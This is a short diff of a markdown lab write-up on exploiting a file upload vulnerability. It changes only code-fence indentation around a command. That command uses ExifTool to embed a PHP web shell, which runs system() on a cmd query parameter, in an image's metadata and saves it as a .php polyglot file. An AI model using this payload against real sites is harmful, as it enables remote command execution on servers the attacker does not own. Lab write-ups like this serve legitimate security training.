@@ -25,9 +25,9 @@ This lab demonstrates how to exploit a vulnerable file upload functionality by c
 - Created a polyglot PHP/JPG file by embedding the PHP payload into the metadata of a valid image file:
   - Downloaded and installed **ExifTool**.
   - Ran the following command to add the payload to the image's `Comment` field and save it as `webshell.php`:
-    ```php
+  ```php
   exiftool -comment="<?php echo 'FUCK OFF'. system($_GET['cmd']) .'HAHA'; ?>" escaltor.PNG -o webshell.php
-    ```
+  ```
 - This created a valid image file (`webshell.php`) that included the PHP payload in its metadata and used the `.php` extension.
 
 ### 4. **Uploading the Polyglot File**
